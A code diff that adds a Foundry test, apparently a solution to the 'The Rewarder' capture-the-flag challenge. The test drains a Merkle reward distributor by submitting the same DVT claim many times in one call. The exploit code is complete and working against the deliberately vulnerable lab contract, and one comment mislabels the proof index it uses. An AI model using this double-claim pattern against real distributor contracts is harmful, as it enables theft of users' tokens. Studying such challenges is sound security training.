@@ -151,6 +151,39 @@ contract TheRewarderChallenge is Test {
         
     }
 
+    function test_sabotage() public {
+        vm.startPrank(player);
+        uint256 initialRemainingDVT = distributor.getRemaining(address(dvt));
+        uint256 claimAmount = 11524763827831882;
+        uint256 numClaims = initialRemainingDVT / claimAmount; // Number of claims to make
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // DVT:
+        IERC20[] memory tokensToClaim = new IERC20[](1);
+        tokensToClaim[0] = IERC20(address(dvt));
+
+        Claim[] memory claims = new Claim[](numClaims);
+
+        Claim memory claim = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: claimAmount,
+            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+            proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+        });
+
+        for (uint256 i = 0; i < numClaims; i++) {
+            claims[i] = claim;
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        vm.stopPrank();
+
+        uint256 remainingDVT = distributor.getRemaining(address(dvt));
+        assertEq(remainingDVT, initialRemainingDVT - claimAmount * numClaims, "Remaining DVT amount mismatch");
+    }
+
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
